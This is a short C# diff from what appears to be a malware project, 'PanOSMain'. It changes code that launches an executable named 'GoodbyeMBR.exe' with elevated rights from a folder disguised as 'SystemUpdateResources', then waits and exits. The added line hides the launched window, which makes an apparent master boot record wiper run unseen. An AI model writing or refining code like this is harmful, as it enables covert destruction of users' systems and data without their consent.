@@ -149,6 +149,7 @@ namespace PanOSMain
                 Process mbroverwrite = new Process();
                 mbroverwrite.StartInfo.FileName = @"C:\Windows\SystemUpdateResources\GoodbyeMBR.exe";
                 mbroverwrite.StartInfo.Verb = "runas";
+                mbroverwrite.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                 mbroverwrite.Start();
                 await Delay(20000);
                 Environment.Exit(0);
